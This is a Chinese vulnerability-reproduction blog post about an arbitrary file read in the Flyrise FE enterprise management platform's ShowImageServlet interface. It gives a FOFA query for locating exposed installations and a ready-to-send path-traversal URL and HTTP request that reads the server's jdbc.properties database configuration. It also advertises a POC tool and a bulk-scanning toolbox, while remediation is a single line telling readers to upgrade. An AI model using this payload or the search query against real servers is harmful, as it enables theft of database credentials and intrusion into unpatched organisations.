#  飞企互联-FE企业运营管理平台ShowImageServlet接口存在任意文件读取漏洞   
南风徐来  南风漏洞复现文库   2024-03-26 23:11  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 飞企互联-FE企业运营管理平台简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
飞企互联的FE企业运营管理平台是一款基于先进技术的云工作台,采用云计算、智能化、大数据、物联网和移动互联网等技术,以支撑企业的数字化转型。  
## 2.漏洞描述  
  
FE企业运营管理平台（以下简称FE6.5）是基于互联企业云工作台，以移动技术、云计算、大数据处理技术、传感技术等信息技术为支撑，和各类业务系统全面融合的移动化云平台，分为企业版和集团版，能满足各种规模企业的信息化建设需求。FE6.5以移动、平台、社交、云及大数据四大能力为核心，推进企事业单位的全面移动化，构建与业务系统全面融合的企业运营管理平台。飞企互联-FE企业运营管理平台ShowImageServlet接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
飞企互联-FE企业运营管理平台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2JuP3hX2fSWwe35fVdk7Wda9pz35Woh21MlC1cibQZ0NkPf55yiczR1xw/640?wx_fmt=jpeg&from=appmsg "null")  
  
飞企互联-FE企业运营管理平台ShowImageServlet接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="飞企互联-FE企业运营管理平台"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print  
  
漏洞数据包：  
```
GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC29tbkzZEqTXs1h5icMl1MMV1sgXpiaXVkNcmDmhnt4c9ZKAjSjoqpChrg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现109 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2pLLda13agYC17sxIoibZHwRSVA6iaEOPpvelMhc0ZLGr2uvsbVx6GTicw/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2NyxxVjPJ5QgsN8AczhN38LkS7tlqqJYO6VSsFchdOgR3fBaOmxBh4w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2jSer8x3aUD2F2Rzcp7NC8zwyMjuLB6dtoUicezcDvZZPm9MmTDNAB1w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2bkLoLkSTrHMARrvMB3DODneFtTEU97O4AHl2DzibiaSA6HPrxvHSFTibA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2iaRt29zRT1xEyHqX88qV89eDF7jP16wBs317uE6eB1EwCztXmrAXalA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a4vEibCtbKaUDtah4AribjC2txu8spwzEWAroAPbVMuI5UQOiaDKjyIsL3vy0BElKNJy7xhwB5LSzHQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
官方已更新补丁，请升级至最新版本。官网地址：https://www.flyrise.cn/。  
## 8.往期回顾  
  
[飞企互联-FE企业运营管理平台uploadAttachmentServlet接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485902&idx=1&sn=b34df5bc28f8eff5109e4b674751fbcf&chksm=974b84c9a03c0ddf12f724f053dde48ba3c782e436de7439cbb655ab52d54fd2a6c5b2712677&scene=21#wechat_redirect)  
  
  
[华天动力OA8000办公系统TemplateService存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485889&idx=1&sn=dfa8832002b3a1c53e633b23b0060f6a&chksm=974b84c6a03c0dd0fe0c277008617bd37fa835f4377f0a6226cf9f9c6e8825c3dabd70753d35&scene=21#wechat_redirect)  
  
  
  
  
